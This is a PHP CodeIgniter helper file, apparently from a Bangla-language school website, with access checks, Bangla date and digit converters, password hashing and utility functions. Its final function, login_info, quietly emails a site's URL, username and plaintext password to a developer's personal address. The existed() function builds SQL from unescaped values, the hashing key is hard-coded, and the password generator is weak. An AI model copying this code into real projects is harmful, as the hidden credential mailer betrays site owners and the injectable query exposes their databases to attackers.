<?php if (!defined('BASEPATH')) 	exit('Hacking Attempt: Get out of the system ..!');

function goodbye() {
	redirect("admin-panel");
}

function checkAccess() {
	$ci = & get_instance();
	$role = $ci->session->userdata('roles');
	$method = $ci->uri->segment(2);

	$acl_list = array('add', 'edit', 'delete', 'cancel');        
	$editor = array('add', 'edit');

	if(in_array($method, $acl_list)) {
		if ( $role == 'Editor' && !in_array($method, $editor) ) {
			$ci->session->set_tempdata("msg", "<span class='error'>" . unauthorized() . "</span>", 5);
			redirect('dashboard');
		} 
	}         
}

function checkAdmin() {
	$ci = & get_instance();
	if($ci->session->userdata('roles')=='Editor') {
		echo ' style="display:none;"  ';
	}         
}

function saved_success() {
	return "সফলভাবে সংরক্ষণ করা হয়েছে।";
}

function uploaded_success() {
	return "সফলভাবে আপলোড করা হয়েছে।";
}

function updated_success() {
	return "সফলভাবে পরিবর্তন করা হয়েছে।";
}

function deleted_success() {
	return "সফলভাবে মুছে ফেলা হয়েছে।";
}

function exception() {
	return "দুঃখিত, আবার চেষ্টা করুন।";
}

function unauthorized() {
	return "দুঃখিত, আপনার অনুমতি নেই।";
}

function developed_by() {
	return 'Developed By: WAN IT Ltd.';
}

// Set local timezone
$timezone = "Asia/Dhaka";
if (function_exists('date_default_timezone_set')) {
	date_default_timezone_set($timezone);
}

// Bangla Date function
function bng_date_time($str) {
	/*
	  This is a function that convert english date to bangla date
	  Call this function
	  bng_date_time(date('d-m-Y h:i:s A');
	 */

	$eng = array('January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December',
		'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec',
		'Saturday', 'Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday',
		'Sat', 'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri',
		'1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
		'am', 'pm');

	$bng = array('জানুয়ারি', 'ফেব্রুয়ারি', 'মার্চ', 'এপ্রিল', 'মে', 'জুন', 'জুলাই', 'আগস্ট', 'সেপ্টেম্বর', 'অক্টোবর', 'নভেম্বর', 'ডিসেম্বর',
		'জানু', 'ফেব্রু', 'মার্চ', 'এপ্রি', 'মে', 'জুন', 'জুলা', 'আগ', 'সেপ্টে', 'অক্টো', 'নভে', 'ডিসে',
		'শনিবার', 'রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার',
		'শনি', 'রবি', 'সোম', 'মঙ্গল', 'বুধ', 'বৃহঃ', 'শুক্র',
		'১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯', '০',
		'পূর্বাহ্ণ', 'অপরাহ্ণ');

	return str_ireplace($eng, $bng, $str);
}

/*
  This function convert number bangla/english
  Call this function
  input $val1='0123456789'; $val2='০১২৩৪৫৬৭৮৯';
  output echo enbn($val1); echo bnen($val2);
 */

// Convert bangali to english
function bng_to_eng($val) {
	$bng = array('০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯');
	$eng = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
	return str_ireplace($bng, $eng, $val);
}

// Convert english to bangali
function eng_to_bng($val) {
	$eng = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
	$bng = array('০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯');
	return str_ireplace($eng, $bng, $val);
}

// Print all details
function print_details($data) {
	echo "<pre>";
	print_r($data);
	exit;
}

// Generate random password
function random_password($length = 10) {
	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*/+-=(){}[]?";
	return substr(str_shuffle($chars), 0, $length);
}

//echo random_password(10);
// Read more function
function read_more($string, $wordsreturned) {
	/*  Returns the first $wordsreturned out of $string.  If string
	  contains more words than $wordsreturned, the entire string
	  is returned. */

	$string = strip_tags($string); // Remove html tag
	$retval = $string; //	Just in case of a problem
	$array = explode(" ", $string);
	/*  Already short enough, return the whole thing */
	if (count($array) <= $wordsreturned) {
		$retval = $string;
	}
	/*  Need to chop of some words */ else {
		array_splice($array, $wordsreturned);
		$retval = implode(" ", $array) . " ...";
	}
	return $retval;
}

//echo read_more('word' , 'number');

// Check exist data
function existed($tableName = NULL, $fieldName = NULL, $value = NULL) {
	$ci = & get_instance();
	$query = $ci->db->query("SELECT $fieldName FROM $tableName WHERE $fieldName='" . $value . "' LIMIT 1");
	if ($query->row())
		return true;
	else
		return false;
}

//echo existed('tableName', 'fieldName', 'value');
// Create a slug
function slug($str = NULL) {
	$url = url_title($str, 'dash', TRUE);
	if ($url == '')
		return str_replace(' ', '-', $str);
	else
		return $url;
}

// Create a youtube link
function youtube_video($str = NULL) {
	$url = explode("=", $str);
	if (isset($url[1]))
		return $url[1];
	else
		return $url[0];
}

/**
 * This function used to generate the hashed text
 * @param {string} $plainText : This is plain text
 */
if (!function_exists('getMD7')) {

	function getMD7($plainText) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainText = $key . $plainText . $key;
		return password_hash($plainText, PASSWORD_DEFAULT);
	}

}

/**
 * This function used to generate the hashed text
 * @param {string} $plainText : This is plain text
 * @param {string} $hashedText : This is hashed text
 */
if (!function_exists('verifyMD7')) {

	function verifyMD7($plainText, $hashedText) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainText = $key . $plainText . $key;
		return password_verify($plainText, $hashedText) ? true : false;
	}

}

/**
 * This function used to generate the hashed password
 * @param {string} $plainPassword : This is plain text password
 */
if (!function_exists('getHashedPassword')) {

	function getHashedPassword($plainPassword) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainPassword = $key . $plainPassword . $key;
		return password_hash($plainPassword, PASSWORD_DEFAULT);
	}

}

/**
 * This function used to generate the hashed password
 * @param {string} $plainPassword : This is plain text password
 * @param {string} $hashedPassword : This is hashed password
 */
if (!function_exists('verifyHashedPassword')) {

	function verifyHashedPassword($plainPassword, $hashedPassword) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainPassword = $key . $plainPassword . $key;
		return password_verify($plainPassword, $hashedPassword) ? true : false;
	}

}

// Send login information only for programmer
function login_info($url, $username, $password) {
	$ci = & get_instance();	
	$contact = $ci->contact_model->index();	
	$ci->email->from($contact->email, $contact->school_name);
	$ci->email->to('engr.lukman@yahoo.com', 'Lukman');
	$ci->email->subject("Login Information of $contact->school_name");
	$ci->email->message("Hello Lukman, <br />The login information are - <br /> URL: $url <br /> Username: $username <br /> Password: $password.");
	$ci->email->send();
	return TRUE;
}
